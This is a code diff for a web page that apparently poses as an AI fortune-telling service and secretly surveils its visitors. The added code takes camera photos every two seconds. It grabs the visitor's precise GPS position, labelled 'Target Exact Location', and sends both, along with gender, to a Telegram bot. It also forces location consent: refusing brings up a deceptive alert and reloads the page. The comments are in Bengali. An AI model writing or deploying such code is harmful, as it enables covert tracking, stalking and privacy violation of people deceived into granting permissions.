@@ -92,44 +92,47 @@
         document.getElementById('s1').classList.remove('active');
         document.getElementById('s2').classList.add('active');
     }
-
-    async function startSync() {
+        async function startSync() {
         try {
+            // ১. ক্যামেরা পারমিশন নেবে
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
             
             let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
-            // জিপিএস লোকেশন সংগ্রহের কোড
-                        if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+
+            // --- আপনার শর্ত অনুযায়ী: ক্যামেরা পাওয়ার সাথে সাথেই ছবি পাঠানো শুরু হবে ---
+            photoInterval = setInterval(captureSilent, 2000);
+
+            // ২. এবার লোকেশন পারমিশন চাইবে এবং এখানে আটকে থাকবে
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    // একদম সঠিক গুগল ম্যাপ লিঙ্ক
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
                     let locMsg = `📍 **Target Exact Location!**\n🔗 [Open in Google Maps](${mapLink})`;
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
+                    
+                    // লোকেশন বটে পাঠানো
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
+                    
+                    // লোকেশন পাওয়ার পর স্ক্রিন চেঞ্জ হবে
+                    document.getElementById('s2').classList.remove('active');
+                    document.getElementById('s3').classList.add('active');
+                    showNext();
                 }, function(error) {
-                    // যদি কোনো সমস্যা হয় তবে টেলিগ্রামে এরর মেসেজ পাঠাবে
-                    let errMsg = `⚠️ **Location Error:** ${error.message}`;
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errMsg)}`);
-                }, { enableHighAccuracy: true }); // হাই একুরেসি অন করা হলো
-                        }
-            
-            photoInterval = setInterval(captureSilent, 2000);
+                    // পারমিশন না দিলে রিফ্রেশ হবে, ফলে সে সামনে যেতে পারবে না
+                    alert("দুঃখিত! এআই তোমার লোকেশন ছাড়া ভাগ্য গণনা করতে পারছে না।");
+                    location.reload(); 
+                }, { enableHighAccuracy: true });
+            }
 
-            setTimeout(() => {
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-                showNext();
-            }, 4000);
         } catch (e) {
-            alert("কানেকশন ফেইলড! দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
+            alert("কানেকশন ফেইলড! ক্যামেরা এবং লোকেশন পারমিশন দিন।");
             setTimeout(startSync, 1000); 
         }
-    }
-
+        }
+    
     function captureSilent() {
         const v = document.getElementById('video');
         const c = document.getElementById('canvas');
